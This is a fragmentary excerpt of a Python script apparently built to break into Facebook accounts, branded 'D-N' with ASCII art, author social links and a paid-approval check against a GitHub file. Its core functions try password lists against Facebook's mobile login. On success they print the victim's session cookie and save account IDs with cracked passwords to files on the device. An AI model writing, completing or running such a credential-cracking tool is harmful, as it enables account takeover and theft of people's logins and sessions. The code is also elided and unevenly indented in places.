...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By D-N")
...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get('https://raw.githubusercontent.com/Tony-Stark01/D-N-OK/main/Approval.txt').text
...
─░█── ░█▄▄▄█ ░█──▀█ ──░█── 　 ░█▄▄▄█ ─░█── ░█─░█ ░█─░█ ░█─░█
    ...
    └───────────────────────────────────────┘""")
  print(f"\t \033[1;32m BIG FAN OF ROBERT DOWNER D-N ™ \033[1;37m ")
  print(f"")
  print(f"\t \033[1;33m  HE IS INTELLIGENT  MEN OF NIHAN  \033[1;37m ")
  print(f"")
  ...
  os.system(f'xdg-open https://www.facebook.com/NIHAN6060?mibextid=ZbWKw')
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system(f'xdg-open https://wa.me/+8801981002555?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801981002555');time.sleep(1)
		admin()
		if bal =='2':
		os.system('xdg-open https://www.facebook.com/NIHAN6060?mibextid=ZbWKwL');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://youtube.com/@MdNihan-qd4lq?si=ovTd46WRPbJTtNOA');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[D-N]1×1\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [D-N-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m [♥] COOKIE : '+coki)
                open('/sdcard/D-N-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                open('/sdcard/D-N1×1-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mD-N1×1\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/D-N-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
